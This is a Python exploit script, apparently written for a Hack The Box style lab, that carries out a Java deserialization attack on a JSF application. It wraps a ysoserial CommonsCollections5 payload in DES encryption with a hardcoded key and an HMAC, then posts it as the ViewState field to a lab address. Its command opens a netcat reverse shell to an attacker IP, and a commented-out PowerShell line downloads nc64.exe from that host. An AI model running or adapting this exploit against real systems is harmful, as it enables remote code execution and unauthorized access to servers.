import pyDes, hmac
import base64 
import requests
import hashlib 
import subprocess


#cmd = 'powershell iwr http://10.10.14.13:8000/nc64.exe -OutFile ./nc.exe'
cmd = 'nc.exe -e cmd 10.10.14.13 9888'
secret_key = bytes(base64.b64decode("SnNGOTg3Ni0="))


def yoserial_command(cmd):
 
    p = subprocess.Popen('java -jar yo.jar CommonsCollections5 "'+cmd+'"', stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)
    payload = p.stdout.read()
    return payload
   

def encrypt_object(key):

    key = secret_key 

    des_object = pyDes.des(key, pyDes.ECB, IV=None, padmode=pyDes.PAD_PKCS5)
    encrypted_payload =  des_object.encrypt(yoserial_command(cmd))
    return encrypted_payload



def calculate_mac(key):

    #calculate mac value
    encrypted = encrypt_object(key) 
    mac_obj = hmac.new(secret_key, encrypted, hashlib.sha1)
    mac = mac_obj.digest()

    # return [encrypted_data + HMAC]
    out = base64.encodestring(encrypted + mac)
    out = out.replace('\n', '').replace('\r', '')
    
    return out 
    

def post_request():

    #Use proxy paramater if you want to intercept the request with BurpSuite
    proxy = {"http" : "http://127.0.0.1:8080", "https": "https://127.0.0.1:8080" }
    

    url = "http://10.10.10.130:8080/userSubscribe.faces"
    cookies = {"JSESSIONID": "021E7B917A294E57B845EF817FCA760A"}
    req_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"}
    req_data={"j_id_jsp_1623871077_1:email": "test@myscript.com", "j_id_jsp_1623871077_1:submit": "SIGN UP", "j_id_jsp_1623871077_1_SUBMIT": "1"}
    req_data['javax.faces.ViewState'] = calculate_mac(secret_key)  

    r = requests.post(url, cookies=cookies, proxies=proxy,  data=req_data, headers=req_headers)


print post_request()


